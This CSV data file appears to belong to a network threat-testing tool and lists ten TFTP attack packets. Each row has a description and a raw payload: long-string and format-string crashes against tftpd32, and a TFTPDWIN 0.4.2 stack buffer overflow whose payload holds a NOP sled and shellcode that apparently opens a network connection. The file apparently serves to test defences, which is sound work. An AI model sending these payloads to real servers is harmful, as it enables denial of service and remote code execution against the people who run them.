XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿tftpTransfer.xml,TFTP Long Transfer Mode String,"This threat sends a TFTP request with a long transfer mode string. This is known to cause crashes in certain TFTP servers, possibly leading to remote code execution.  TFTP servers normally listen on port 69.",TFTP,UDP,[[00 01 ]]foo.txt[[00 ]]netasciiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[00]]
﻿tftpTransfer_IPv6.xml,TFTP Long Transfer Mode String (IPv6 Version),"This threat sends a TFTP request with a long transfer mode string. This is known to cause crashes in certain TFTP servers, possibly leading to remote code execution.  TFTP servers normally listen on port 69. (IPv6 Version)",TFTP/IPv6,UDP,[[00 01 ]]foo.txt[[00 ]]netasciiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[00]]
﻿tftpd32.xml,TFTPD32 Denial of Service,This threat sends a request for a file of 508 A's.  Causes instability and possible crashing in the tftpd32 daemon.  The TFTP service typically listens on UDP port 69.,TFTP,UDP,[[00 01 ]]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[00 ]]netascii[[00]]
﻿tftpd32_IPv6.xml,TFTPD32 Denial of Service (IPv6 Version),This threat sends a request for a file of 508 A's.  Causes instability and possible crashing in the tftpd32 daemon.  The TFTP service typically listens on UDP port 69. (IPv6 Version),TFTP/IPv6,UDP,[[00 01 ]]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[00 ]]netascii[[00]]
﻿tftpd32_fs.xml,Tftpd32 Format String Vulnerability,This threat sends a malicious TFTP GET request containing a format string which causes a spurious write ending in a crash. Tftpd32 is a TFTP daemon which typically listens on port 69,TFTP,UDP,[[00 01 ]]%.1000x[[00 ]]octet[[00]]
﻿tftpd32_fs_IPv6.xml,Tftpd32 Format String Vulnerability (IPv6 Version),This threat sends a malicious TFTP GET request containing a format string which causes a spurious write ending in a crash. Tftpd32 is a TFTP daemon which typically listens on port 69 (IPv6 Version),TFTP/IPv6,UDP,[[00 01 ]]%.1000x[[00 ]]octet[[00]]
﻿tftpd_rfs.xml,Tftpd32 SEND / GET Remote Format String Vulnerability,"This threat exploits a remote format string vulnerability in Tftpd32 that can be triggered when the server uses the filename passed in TFTP requests to construct an error message. With a specially crafted filename, an attacker can cause arbitrary code execution, resulting in a loss of integrity. TFTPd is a internet application that usually listens on udp port 69",TFTP,UDP,[[00 01 ]]%.1000x[[00 ]]octet[[00 00 FF]]
﻿tftpd_rfs_IPv6.xml,Tftpd32 SEND / GET Remote Format String Vulnerability (IPv6 Version),"This threat exploits a remote format string vulnerability in Tftpd32 that can be triggered when the server uses the filename passed in TFTP requests to construct an error message. With a specially crafted filename, an attacker can cause arbitrary code execution, resulting in a loss of integrity. TFTPd is a internet application that usually listens on udp port 69 (IPv6 Version)",TFTP/IPv6,UDP,[[00 01 ]]%.1000x[[00 ]]octet[[00 00 FF]]
﻿﻿tftpdwin_bof.xml,TFTPDWIN 0.4.2 Remote Buffer Overflow Vulnerability,"This threat leverages a stack-based buffer overflow in TFTPDWIN 0.4.2 and
earlier that allows for execution of arbitrary code or DoS via a long file name. 
TFTPDWIN is a tftp server that typically listens on udp port 69.",TFTP,UDP,"[[00 01 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 8B C3 ]]f[[05 12 01 ]]P[[C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 ]]Y[[81 C9 D3 ]]b0 ACMdd[[99 96 8D ]]~[[E8 ]]d[[8B ]]Z0[[8B ]]K[[0C 8B ]]I[[1C 8B 09 8B ]]i[[08 B6 03 ]]+[[E2 ]]f[[BA ]]32Rhws2_T[[AC ]]<[[D3 ]]u[[06 95 FF ]]W[[F4 95 ]]W`[[8B ]]E<[[8B ]]L[[05 ]]x[[03 CD 8B ]]Y [[03 DD ]]3[[FF ]]G[[8B ]]4[[BB 03 F5 99 AC ]]4q*[[D0 ]]<qu[[F7 ]]:T$[[1C ]]u[[EA 8B ]]Y$[[03 DD ]]f[[8B ]]<{[[8B ]]Y[[1C 03 DD 03 ]],[[BB 95 ]]_[[AB ]]Wa;[[F7 ]]u[[B4 ]]^Tj[[02 AD FF D0 88 ]]F[[13 8D ]]H0[[8B FC F3 AB ]]@P@P[[AD FF D0 95 B8 02 FF 11 ]]\2[[E4 ]]PTU[[AD FF D0 85 C0 ]]t[[F8 FE ]]D$-[[FE ]]D$,[[83 EF ]]l[[AB AB AB ]]XTTPPPTPPVP[[FF ]]V[[E4 FF ]]V[[E8 90 90 90 90 90 90 90 ]]B[[FB ]]a@[[00 ]]netascii[[00]]"
﻿tftpdwin_bof_IPv6.xml,TFTPDWIN 0.4.2 Remote Buffer Overflow Vulnerability (IPv6 Version),"This threat leverages a stack-based buffer overflow in TFTPDWIN 0.4.2 and
earlier that allows for execution of arbitrary code or DoS via a long file name. 
TFTPDWIN is a tftp server that typically listens on udp port 69. (IPv6 Version)",TFTP/IPv6,UDP,"[[00 01 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 8B C3 ]]f[[05 12 01 ]]P[[C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 ]]Y[[81 C9 D3 ]]b0 ACMdd[[99 96 8D ]]~[[E8 ]]d[[8B ]]Z0[[8B ]]K[[0C 8B ]]I[[1C 8B 09 8B ]]i[[08 B6 03 ]]+[[E2 ]]f[[BA ]]32Rhws2_T[[AC ]]<[[D3 ]]u[[06 95 FF ]]W[[F4 95 ]]W`[[8B ]]E<[[8B ]]L[[05 ]]x[[03 CD 8B ]]Y [[03 DD ]]3[[FF ]]G[[8B ]]4[[BB 03 F5 99 AC ]]4q*[[D0 ]]<qu[[F7 ]]:T$[[1C ]]u[[EA 8B ]]Y$[[03 DD ]]f[[8B ]]<{[[8B ]]Y[[1C 03 DD 03 ]],[[BB 95 ]]_[[AB ]]Wa;[[F7 ]]u[[B4 ]]^Tj[[02 AD FF D0 88 ]]F[[13 8D ]]H0[[8B FC F3 AB ]]@P@P[[AD FF D0 95 B8 02 FF 11 ]]\2[[E4 ]]PTU[[AD FF D0 85 C0 ]]t[[F8 FE ]]D$-[[FE ]]D$,[[83 EF ]]l[[AB AB AB ]]XTTPPPTPPVP[[FF ]]V[[E4 FF ]]V[[E8 90 90 90 90 90 90 90 ]]B[[FB ]]a@[[00 ]]netascii[[00]]"
